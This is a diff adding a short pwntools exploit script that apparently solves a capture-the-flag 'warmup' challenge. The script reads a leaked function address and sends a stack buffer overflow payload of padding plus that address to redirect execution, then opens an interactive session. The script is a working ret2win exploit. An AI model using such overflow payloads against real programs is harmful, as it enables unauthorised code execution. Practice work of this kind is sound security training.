@@ -1,0 +1,17 @@
+from pwn import *
+
+p = process("./warmup")
+'''
+p = gdb.debug("./warmup", gdbscript = 
+break *easy + 1
+r
+)
+'''
+
+p.recvuntil(b"WOW:")
+win = int(p.recvline(), 16)
+
+payload = b"A" * 0x40 + b"B" * 0x8 + p64(win + 1)
+p.sendlineafter(b">", payload)
+
+p.interactive()
